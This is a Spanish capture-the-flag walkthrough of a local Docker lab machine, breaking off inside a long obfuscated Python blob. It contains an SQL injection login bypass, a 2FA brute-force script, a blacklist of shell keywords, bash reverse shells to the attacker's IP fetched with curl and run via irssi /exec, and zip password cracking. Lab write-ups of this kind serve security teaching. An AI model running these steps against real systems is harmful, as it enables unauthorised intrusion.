## Paso 1: Levantamos el Docker
Para comenzar, ejecutamos el script de despliegue del contenedor con el siguiente comando:
```bash
sudo bash auto_deploy.sh doubletrouble.tar
```
como resultado tenemos que la IP es : *172.17.0.2*

ahora usamos estos comandos:
```bash
sudo ip addres del 172.17.0.1/16 dev docker0 # elimina mi actual direccion ip
```
con este comando eliminamos la actual direccion ip en docker

```bash
sudo ip addres add 172.17.0.183/16 dev docker0 # asigno la ip de la reverseshell
```
con este comando asigno la nueva dirección,
*esto no debería hacerse aquí pero de no hacerse en una fase avanzada nos va a tocar volver a hacer todo de cero por la nueva interfaz de red*
eso me pasó cuando la hice a ciegas
## paso 2: fase enumeración
Realizo un escaneo con nmap para ver que puertos y servicios (con sus versiones) tiene el servidor:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.183 -oN PuertosYservicios
```
```
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up, received arp-response (0.0000070s latency).
Scanned at 2024-12-20 06:23:03 EST for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Solo tenemos el puerto 80, asi pues vamos manos a la obra (con whatweb no encontré nada interesante y en código fuente de la página tampoco)

## Paso 3:intrusión desde la página web
realizo un fuzzing para ver de que otras rutas dispongo:
```bash
feroxbuster -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o feroxbuster
```
*explicacion:*
-u: para indicar la url
-w: para indicar la wordlist que vamos a utilizar
-x: extensiones que queremos que busque
-o: para exportar los resultados a un archivo

nos arroja estas rutas:
```
http://172.17.0.2/
http://172.17.0.2/index.php
http://172.17.0.2/javascript => http://172.17.0.2/javascript/
http://172.17.0.2/javascript/jquery => http://172.17.0.2/javascript/jquery/
```
no encuentro nada relevante en ellas y me centro el el index.php, hay un login y pruebo una inyección sencilla:
```bash
admin'or 1=1-- -
```
y nos manda a otro panel para un segundo factor de autentificacion, en el cual se introducen 4 digitos, mi idea inicial es un ataque por fuezabruta pero,
hay intentos fallidos (3 al cuarto sales del 2fa) asi que hago una captura con brupsuite de las dos peticiones y me hago un script para automatizalo:
```bash
import requests
import time

# Configuración
login_url = "http://172.17.0.2/index.php"
twofa_url = "http://172.17.0.2/2fa.php"
username = "admin' or 1=1-- -"
password = "admin' or 1=1-- -"
max_attempts = 3  # Limite de intentos

# Sesión para mantener la cookie de PHPSESSID
session = requests.Session()

# Función para realizar la autenticación inicial
def authenticate_initial():
    login_data = {
        'username': username,
        'password': password
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    }

    # Realizar la autenticación inicial
    print("Realizando autenticación inicial...")
    response = session.post(login_url, data=login_data, headers=headers)

    if response.status_code == 200 and "Verificación de 2FA" in response.text:
        print("Autenticación inicial exitosa.")
        return True
    else:
        print("Error en la autenticación inicial.")
        return False

# Función para realizar la autenticación 2FA
def authenticate_2fa(code):
    twofa_data = {
        'code': code
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    }

    print(f"Intentando código 2FA: {code}")
    response = session.post(twofa_url, data=twofa_data, headers=headers)

    if response.status_code == 200:
        if "Código incorrecto" in response.text:
            return False
        else:
            # Si encontramos un código correcto (no hay mensaje de error)
            print(f"Código {code} correcto. Autenticación 2FA exitosa.")
            return True
    return False

# Función para ejecutar los intentos
def attempt_2fa():
    attempt_count = 0
    for i in range(0, 10000):
        # Formatear el código con ceros a la izquierda
        code = str(i).zfill(4)

        # Intentar 2FA
        if not authenticate_2fa(code):
            attempt_count += 1
            # Si llegamos al máximo de intentos, reiniciamos
            if attempt_count >= max_attempts:
                print(f"Número máximo de intentos alcanzado ({max_attempts}). Reiniciando el proceso...")
                attempt_count = 0
                if not authenticate_initial():
                    print("Error en la autenticación inicial.")
                    break
        else:
            # Si la autenticación es exitosa, detenemos el script
            print("Autenticación 2FA exitosa.")
            break
        time.sleep(1)  # Pausa entre intentos para evitar bloqueos

# Inicio del proceso
if authenticate_initial():
    attempt_2fa()
```
lo ejecuto y:
```bash
python3 fuerzabruta.py
```
```
Realizando autenticación inicial...
Autenticación inicial exitosa.
Intentando código 2FA: 0150
Código 0150 correcto. Autenticación 2FA exitosa.
Autenticación 2FA exitosa.

```
ya sabemos el segundo factor de autentificacion 0150, hacemos la inyeccion sql y metemos el segundo factor de autentificacion y nos lleva a una pagina nueva
```
http://172.17.0.2/subir_archivos.php
```
Aquí nos deja subir archivo en python y los ejecuta,
intento subir varios archivos con reverse y tiene una black list que no me deja ejecutarlos, hay dos opciones:

-ofuscar

-crear un script

me incliné por crear un script sin saber muy bien las palabras prohibidas de la black list pero,
pruebo este script:
```bash
import subprocess

# Ejecutar ls -la ./
result = subprocess.run(['ls', '-la', '/var/www'], capture_output=True, text=True)

# Imprimir la salida del comando
print(result.stdout)
```
y en la salida veo un archivo interesante (ids.py):
```
total 24
drwxr-xr-x 1 root     root     4096 Nov 27 17:33 .
drwxr-xr-x 1 root     root     4096 Nov 21 03:14 ..
drwxr-xr-x 1 www-data www-data 4096 Jan 15 20:41 html
-rw-r--r-- 1 root     root     2229 Nov 27 17:33 ids.py
```
intento leerlo subiendo otro script:
```bash
import subprocess

# Ejecutar el comando 'cat /var/www/ids.py' y capturar la salida
result = subprocess.run(['cat', '/var/www/ids.py'], capture_output=True, text=True)

# Imprimir la salida del comando
print(result.stdout)
```

en el script veo la blacklist:
```
# Palabras detectar
keywords = ['dev', 'tcp', 'bash', 'udp', 'mkfifo', 'bin', 'busybox', 'ncat', 'telnet', 'null', 'connect', 'wget', 'Socket', 'focus', 'php', 'REQUEST', 'system', 'shell', 'passthru', 'getenv', 'gete', 'python']
```
por lo que veo su puedo utilicar curl, pues por ahi se la voy a meter (la reverseshell malpensados)
creo un script con la reverseshell con nombre rev
```bash
#!/bin/bash
bash -i >& /dev/tcp/172.17.0.183/4444 0>&1
```
monto un servidor python donde está alojada la reverse:
```bash
sudo python3 -m http.server 80
```
creo un script para subir al seervidor la reverseshell haciendo que me haga un curl a mi archivo con el nombre curl.py
```bash
import subprocess

# URL del archivo que deseas descargar
url = "http://172.17.0.183/rev"  # Cambia esto a la URL de tu archivo
file_path = "/tmp/rev"  # Ruta donde se guardará el archivo

# Ejecutar el comando curl para descargar el archivo
try:
    subprocess.run(["curl", "-o", file_path, url], check=True)
    print(f"Archivo descargado correctamente en {file_path}")
except subprocess.CalledProcessError as e:
    print(f"Error al descargar el archivo: {e}")
```
lo subo al servidor, lo ejecuta, y he subido mi script a /tmp/rev
```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    55  100    55    0     0   1958      0 --:--:-- --:--:-- --:--:--  1964
Archivo descargado correctamente en /tmp/rev
```
bueno tenemos la reverse ya en el sistema ahora hay que ejecutarla, primero hago otro script para darla permisos de ejecucion
```bash
import os
import subprocess

# Ruta del archivo
file_path = '/tmp/rev'

# Hacer que el archivo sea ejecutable
try:
    os.chmod(file_path, 0o755)  # 0o755 otorga permisos de ejecución
    print(f"El archivo {file_path} ahora es ejecutable.")
except Exception as e:
    print(f"Error al cambiar los permisos de {file_path}: {e}")
```
ahora un script para ejecutarlo:
```bash

# Ejecutar el archivo
try:
    subprocess.run([file_path], check=True)
    print(f"El archivo {file_path} se ha ejecutado correctamente.")
except Exception as e:
    print(f"Error al ejecutar el archivo {file_path}: {e}")
```
lo subo a la web
y ahora me pongo en escucha por el puerto 4444
```bash
sudo nc -nvlp 4444
```
y con el script de ejecutar tachan!!! estoy dentro

## fase escalada usuario www-data

hacemos tratamiento de la tty:
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```

despues de rebuscar encuentro un zip en
```
/var/backups/.maci/.-/-/archivo500.zip
```
lo traigo a mi máquina y al descomprimirlo hay otro zip y al descomprimir otro... ahí creé otro script, este lo dejo para que lo tabajeis no es muy difícil.

Llego a un punto que obtengo el archivo "archivo0.zip" que me pide un password, con mi buen amigo john puedo descomprimir el contenido:
```bash
zip2john archivo0.zip > hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
ahora descomprimimo el archivo y tenemos esto:
maci:49392923
un user y un pass así pues migramos al user maci
```bash
su maci
```
## fase escalada usuario maci
listamos si tenemos algun privilegio sudo con algún usuario:
```bash
sudo -l
```
```Matching Defaults entries for maci on dc4ed2927b32:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on dc4ed2927b32:
    (darksblack) NOPASSWD: /usr/bin/irssi
```
pues lo ejecutamos como usuario darksblack
```bash
sudo -u darksblack /usr/bin/irssi
```
uso en irssi el comando
```bash
/help
```
y sorpresa me lista los comando que tengo y entre ellos exec
entonces me creo una reverse y la ejecuto con exec, previamente me pongo en escucha en el puerto 5555
```bash
sudo nc -nvlp 5555
```
y en irssi ([(status)] lo trae por defecto irssi, es para que os ubiqueis donde se meten los comandos)
```bash
[(status)] /exec bash -c "bash -i >& /dev/tcp/172.17.0.183/5555 0>&1"
```
## fase escalada usuario darksblack
tratamiento de la tty
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```

con sudo -l listamos de nuevo que privilegios de sudo con que usuarios tengo y obtengo esto:
```
User darksblack may run the following commands on dc4ed2927b32:
    (juan) NOPASSWD: /usr/bin/python3 /home/juan/shell.py
    (juan) NOPASSWD: /bin/cat /home/juan/shell.py
```
si hago un cat veo un script ofuscado no....lo siguiente
```bash
sudo -u juan /bin/cat /home/juan/shell.py
```
```bash
exec("".join([chr(105), chr(109), chr(112), chr(111), chr(114), chr(116), chr(32), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(59), chr(32), chr(101), chr(120), chr(101), chr(99), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(54), chr(52), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(51), chr(50), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(39), chr(77), chr(70), chr(76), chr(84), chr(67), chr(53), chr(51), chr(67), chr(71), chr(78), chr(70), chr(68), chr(65), chr(83), chr(75), chr(73), chr(74), chr(89), chr(50), chr(87), chr(71), chr(53), chr(51), chr(81), chr(79), chr(66), chr(82), chr(70), chr(81), chr(81), chr(84), chr(87), chr(77), chr(78), chr(88), chr(70), chr(67), chr(90), chr(51), chr(67), chr(71), chr(78), chr(71), chr(85), chr(87), chr(89), chr(75), chr(88), chr(71), chr(70), chr(51), chr(87), chr(69), chr(77), chr(50), chr(75), chr(71), chr(66), chr(69), chr(85), chr(81), chr(84), chr(82), chr(82), chr(76), chr(70), chr(88), chr(69), chr(69), chr(54), chr(76), chr(67), chr(71), chr(74), chr(72), chr(71), chr(89), chr(89), chr(90), chr(84), chr(74), chr(86), chr(70), chr(87), chr(67), chr(86), chr(90), chr(82), chr(79), chr(53), chr(82), chr(68), chr(71), chr(83), chr(82), chr(81), chr(74), chr(70), chr(69), chr(69), chr(52), chr(53), chr(83), chr(90), chr(71), chr(74), chr(50), chr(71), chr(89), chr(90), chr(67), chr(66), chr(79), chr(66), chr(89), chr(71), chr(69), chr(87), chr(67), chr(67), chr(79), chr(89), chr(70), chr(71), chr(71), chr(51), chr(83), chr(82), chr(77), chr(53), chr(83), chr(69), chr(79), chr(51), chr(68), chr(85), chr(76), chr(74), chr(73), chr(87), chr(54), chr(83), chr(50), chr(84), chr(73), chr(85), chr(52), chr(86), chr(73), chr(86), chr(83), chr(68), chr(73), chr(69), chr(52), chr(85), chr(83), chr(81), chr(50), chr(74), chr(80), chr(66), chr(72), chr(72), chr(85), chr(83), chr(76), chr(86), chr(74), chr(86), chr(75), chr(71), chr(71), chr(53), chr(75), chr(78), chr(73), chr(77), chr(50), chr(72), chr(81), chr(84), chr(50), chr(69), chr(74), chr(86), chr(85), chr(85), chr(71), chr(51), chr(67), chr(67), chr(75), chr(66), chr(75), chr(87), chr(89), chr(85), chr(76), chr(72), chr(75), chr(66), chr(74), chr(85), chr(67), chr(77), chr(75), chr(78), chr(73), chr(82), chr(65), chr(88), chr(83), chr(81), chr(51), chr(72), chr(79), chr(66), chr(86), chr(86), chr(85), chr(86), chr(50), chr(90), chr(77), chr(53), chr(77), chr(84), chr(69), chr(79), chr(76), chr(86), chr(77), chr(74), chr(87), chr(86), chr(77), chr(50), chr(84), chr(69), chr(73), chr(78), chr(85), chr(71), chr(54), chr(67), chr(84), chr(67), chr(71), chr(78), chr(72), chr(68), chr(65), chr(84), chr(67), chr(68), chr(73), chr(74), chr(51), chr(87), chr(69), chr(77), chr(50), chr(75), chr(71), chr(66), chr(70), chr(86), chr(73), chr(51), chr(50), chr(76), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(74), chr(66), chr(71), chr(87), chr(79), chr(85), chr(67), chr(84), chr(73), chr(74), chr(53), chr(71), chr(69), chr(77), chr(83), chr(79), chr(79), chr(74), chr(78), chr(70), chr(81), chr(85), chr(76), chr(86), chr(77), chr(77), chr(90), chr(68), chr(83), chr(50), chr(84), chr(66), chr(71), chr(74), chr(76), chr(68), chr(65), chr(83), chr(50), chr(73), chr(74), chr(90), chr(51), chr(70), chr(83), chr(77), chr(84), chr(85), chr(78), chr(82), chr(83), chr(69), chr(71), chr(78), chr(75), chr(67), chr(75), chr(74), chr(87), chr(68), chr(83), chr(83), chr(83), chr(85), chr(78), chr(78), chr(76), chr(70), chr(75), chr(84), chr(67), chr(68), chr(73), chr(74), chr(53), chr(71), chr(69), chr(77), chr(83), chr(79), chr(79), chr(74), chr(78), chr(70), chr(81), chr(85), chr(76), chr(86), chr(66), chr(74), chr(75), chr(84), chr(65), chr(79), chr(75), chr(69), chr(75), chr(77), chr(89), chr(84), chr(83), chr(86), chr(67), chr(87), chr(73), chr(90), chr(70), chr(69), chr(77), chr(85), chr(75), chr(86), chr(71), chr(66), chr(89), chr(69), chr(71), chr(50), chr(75), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(84), chr(50), chr(74), chr(82), chr(87), chr(85), chr(52), chr(53), chr(84), chr(67), chr(78), chr(85), chr(50), chr(87), chr(89), chr(87), chr(74), chr(84), chr(75), chr(70), chr(88), chr(85), chr(87), chr(82), chr(51), chr(73), chr(79), chr(90), chr(82), chr(84), chr(71), chr(85), chr(76), chr(84), chr(74), chr(70), chr(69), chr(69), chr(69), chr(53), chr(84), chr(68), chr(78), chr(90), chr(73), chr(88), chr(65), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(82), chr(87), chr(50), chr(86), chr(82), chr(81), chr(77), chr(82), chr(77), chr(69), chr(85), chr(53), chr(75), chr(74), chr(74), chr(66), chr(71), chr(85), chr(87), chr(81), chr(51), chr(78), chr(75), chr(74), chr(87), chr(65), chr(85), chr(87), chr(84), chr(74), chr(73), chr(73), chr(90), chr(86), chr(83), chr(86), chr(51), chr(77), chr(71), chr(66), chr(77), chr(68), chr(69), chr(87), chr(84), chr(87), chr(77), chr(78), chr(87), chr(68), chr(83), chr(50), chr(84), chr(67), chr(71), chr(73), chr(89), chr(88), chr(73), chr(87), chr(75), chr(88), chr(71), chr(86), chr(86), chr(85), chr(87), chr(83), chr(67), chr(78), chr(79), chr(66), chr(72), chr(87), chr(79), chr(51), chr(51), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(50), chr(73), chr(53), chr(68), chr(68), chr(65), chr(87), chr(75), chr(84), chr(73), chr(69), chr(52), chr(85), chr(83), chr(83), chr(67), chr(78), chr(79), chr(86), chr(82), chr(87), chr(50), chr(86), chr(84), chr(75), chr(77), chr(82), chr(85), chr(87), chr(79), chr(54), chr(67), chr(78), chr(73), chr(82), chr(69), chr(84), chr(65), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(81), chr(86), chr(79), chr(87), chr(76), chr(72), chr(76), chr(74), chr(68), chr(85), chr(77), chr(77), chr(65), chr(75), chr(76), chr(70), chr(74), chr(85), chr(67), chr(79), chr(75), chr(81), chr(75), chr(78), chr(65), chr(87), chr(83), chr(89), chr(50), chr(89), chr(75), chr(90), chr(89), chr(71), chr(73), chr(82), chr(84), chr(89), chr(79), chr(86), chr(69), chr(87), chr(85), chr(51), chr(50), chr(76), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(74), chr(53), chr(69), chr(89), chr(51), chr(75), chr(79), chr(79), chr(78), chr(82), chr(68), chr(71), chr(84), chr(84), chr(77), chr(74), chr(78), chr(66), chr(87), chr(87), chr(83), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(67), chr(80), chr(74), chr(83), chr(86), chr(81), chr(84), chr(76), chr(86), chr(76), chr(74), chr(77), chr(71), chr(81), chr(52), chr(68), chr(69), chr(73), chr(78), chr(84), chr(88), chr(79), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(52), chr(70), chr(69), chr(83), chr(54), chr(75), chr(67), chr(71), chr(66), chr(81), chr(85), chr(79), chr(86), chr(76), chr(72), chr(77), chr(77), chr(90), chr(68), chr(83), chr(50), chr(84), chr(66), chr(71), chr(74), chr(76), chr(68), chr(65), chr(83), chr(75), chr(72), chr(75), chr(74), chr(89), chr(70), chr(85), chr(86), chr(50), chr(82), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(68), chr(86), chr(77), chr(52), chr(51), chr(66), chr(75), chr(53), chr(77), chr(87), chr(79), chr(89), chr(83), chr(72), chr(75), chr(90), chr(50), chr(85), chr(87), chr(82), chr(50), chr(83), chr(78), chr(66), chr(83), chr(69), chr(79), chr(82), chr(76), chr(81), chr(74), chr(70), chr(67), chr(68), chr(65), chr(79), chr(75), chr(74), chr(73), chr(82), chr(65), chr(84), chr(77), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(77), chr(78), chr(87), chr(86), chr(77), chr(77), chr(68), chr(69), chr(76), chr(66), chr(70), chr(72), chr(75), chr(67), chr(83), chr(74), chr(73), chr(90), chr(74), chr(72), chr(83), chr(90), chr(67), chr(88), chr(75), chr(86), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(79), chr(86), chr(84), chr(84), chr(77), chr(77), chr(90), chr(70), chr(75), chr(78), chr(83), chr(68), chr(77), chr(53), chr(88), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(81), chr(81), chr(84), chr(90), chr(77), chr(73), chr(90), chr(69), chr(50), chr(90), chr(50), chr(81), chr(75), chr(78), chr(66), chr(72), chr(85), chr(90), chr(67), chr(88), chr(74), chr(74), chr(51), chr(87), chr(71), chr(51), chr(74), chr(90), chr(78), chr(74), chr(78), chr(70), chr(81), chr(84), chr(84), chr(50), chr(74), chr(82), chr(87), chr(69), chr(69), chr(53), chr(84), chr(68), chr(73), chr(53), chr(76), chr(72), chr(75), chr(83), chr(50), chr(72), chr(75), chr(74), chr(85), chr(71), chr(73), chr(82), chr(50), chr(70), chr(79), chr(78), chr(69), chr(85), chr(81), chr(84), chr(84), chr(80), chr(66), chr(74), chr(78), chr(70), chr(79), chr(54), chr(68), chr(84), chr(75), chr(66), chr(76), chr(70), chr(69), chr(54), chr(76), chr(69), chr(75), chr(53), chr(75), chr(88), chr(71), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(77), chr(50), chr(83), chr(78), chr(78), chr(82), chr(68), chr(71), chr(86), chr(82), chr(81), chr(75), chr(66), chr(77), chr(69), chr(52), chr(77), chr(75), chr(90), chr(78), chr(90), chr(66), chr(72), chr(83), chr(89), chr(82), chr(83), chr(74), chr(90), chr(87), chr(65), chr(85), chr(89), chr(90), chr(84), chr(74), chr(86), chr(50), chr(86), chr(75), chr(82), chr(76), chr(77), chr(75), chr(70), chr(74), chr(70), chr(71), chr(53), chr(51), chr(72), chr(77), chr(77), chr(90), chr(86), chr(69), chr(50), chr(50), chr(50), chr(76), chr(66), chr(70), chr(72), chr(83), chr(85), chr(67), chr(89), chr(74), chr(89), chr(89), chr(86), chr(83), chr(51), chr(83), chr(67), chr(80), chr(70), chr(82), chr(68), chr(69), chr(84), chr(84), chr(77), chr(77), chr(77), chr(90), chr(85), chr(50), chr(53), chr(75), chr(86), chr(73), chr(86), chr(87), chr(70), chr(67), chr(85), chr(83), chr(84), chr(79), chr(53), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(89), chr(75), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(74), chr(53), chr(71), chr(73), chr(82), chr(50), chr(83), chr(79), chr(66), chr(82), chr(71), chr(85), chr(77), chr(76), chr(50), chr(77), chr(82), chr(76), chr(85), chr(85), chr(53), chr(51), chr(68), chr(78), chr(85), chr(52), chr(87), chr(85), chr(87), chr(83), chr(89), chr(74), chr(90), chr(53), chr(69), chr(89), chr(51), chr(67), chr(67), chr(74), chr(74), chr(75), chr(85), chr(75), chr(86), chr(76), chr(81), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(77), chr(50), chr(83), chr(78), chr(78), chr(82), chr(68), chr(71), chr(86), chr(82), chr(81), chr(76), chr(65), chr(90), chr(86), chr(85), chr(50), chr(68), chr(67), chr(74), chr(66), chr(76), chr(71), chr(89), chr(83), chr(75), chr(69), chr(71), chr(66), chr(84), chr(87), chr(71), chr(83), chr(67), chr(75), chr(79), chr(89), chr(70), chr(70), chr(83), chr(54), chr(74), chr(86), chr(80), chr(74), chr(83), chr(69), chr(79), chr(85), chr(84), chr(87), chr(77), chr(82), chr(77), chr(70), chr(67), chr(53), chr(76), chr(68), chr(78), chr(86), chr(76), chr(71), chr(81), chr(87), chr(83), chr(68), chr(77), chr(53), chr(89), chr(69), chr(83), chr(81), chr(51), chr(84), chr(77), chr(53), chr(82), chr(85), chr(81), chr(83), chr(84), chr(87), chr(76), chr(70), chr(52), chr(84), chr(75), chr(54), chr(84), chr(69), chr(73), chr(53), chr(74), chr(71), chr(89), chr(89), chr(51), chr(79), chr(74), chr(70), chr(50), chr(87), chr(71), chr(51), chr(75), chr(87), chr(78), chr(66), chr(78), chr(69), chr(71), chr(90), chr(51), chr(81), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(54), chr(74), chr(86), chr(80), chr(74), chr(78), chr(70), chr(79), chr(78), chr(76), chr(76), chr(74), chr(78), chr(69), chr(69), chr(52), chr(77), chr(67), chr(50), chr(73), chr(52), chr(52), chr(84), chr(67), chr(67), chr(84), chr(69), chr(73), chr(89), chr(52), chr(84), chr(69), chr(87), chr(75), chr(88), chr(80), chr(65), chr(89), chr(86), chr(85), chr(85), chr(51), chr(76), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(72), chr(83), chr(87), chr(83), chr(89), chr(75), chr(73), chr(89), chr(87), chr(71), chr(51), chr(74), chr(85), chr(77), chr(53), chr(74), chr(71), chr(50), chr(82), chr(84), chr(84), chr(77), chr(77), chr(90), chr(70), chr(75), chr(83), chr(50), chr(68), chr(78), chr(86), chr(74), chr(71), chr(89), chr(87), chr(84), chr(74), chr(73), chr(74), chr(50), chr(70), chr(83), chr(86), chr(51), chr(77), chr(79), chr(86), chr(70), chr(85), chr(71), chr(50), chr(90), chr(87), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(68), chr(71), chr(89), chr(75), chr(72), chr(78), chr(82), chr(90), chr(86), chr(85), chr(85), chr(50), chr(67), chr(75), chr(86), chr(82), chr(87), chr(52), chr(86), chr(84), chr(77), chr(66), chr(74), chr(72), chr(87), chr(79), chr(51), chr(51), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(73), chr(74), chr(90), chr(51), chr(70), chr(83), chr(77), chr(84), chr(85), chr(78), chr(82), chr(83), chr(69), chr(77), chr(79), chr(76), chr(76), chr(77), chr(70), chr(76), chr(86), chr(77), chr(50), chr(50), chr(74), chr(73), chr(81), chr(89), chr(71), chr(79), chr(85), chr(84), chr(78), chr(73), chr(90), chr(90), chr(87), chr(71), chr(77), chr(83), chr(86), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(68), chr(65), chr(89), chr(51), chr(79), chr(78), chr(77), chr(51), chr(69), chr(71), chr(50), chr(75), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(73), chr(74), chr(86), chr(84), chr(81), chr(85), chr(85), chr(67), chr(84), chr(73), chr(74), chr(86), chr(71), chr(69), chr(77), chr(82), chr(86), chr(79), chr(86), chr(78), chr(70), chr(79), chr(84), chr(82), chr(81), chr(74), chr(78), chr(67), chr(87), chr(81), chr(85), chr(67), chr(86), chr(71), chr(70), chr(73), chr(88), chr(71), chr(83), chr(75), chr(71), chr(73), chr(74), chr(73), chr(70), chr(75), chr(51), chr(67), chr(82), chr(79), chr(66), chr(66), chr(87), chr(83), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(83), chr(68), chr(69), chr(78), chr(53), chr(81), chr(86), chr(79), chr(54), chr(68), chr(77), chr(74), chr(70), chr(68), chr(84), chr(75), chr(53), chr(84), chr(69), chr(73), chr(78), chr(66), chr(72), chr(85), chr(89), chr(82), chr(83), chr(74), chr(90), chr(90), chr(70), chr(85), chr(87), chr(67), chr(83), chr(77), chr(90), chr(78), chr(69), chr(79), chr(51), chr(68), chr(77), chr(76), chr(74), chr(67), chr(71), chr(54), chr(83), chr(89), chr(75), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(69), chr(69), chr(52), chr(53), chr(83), chr(90), chr(71), chr(74), chr(50), chr(71), chr(89), chr(90), chr(67), chr(71), chr(72), chr(70), chr(86), chr(87), chr(67), chr(86), 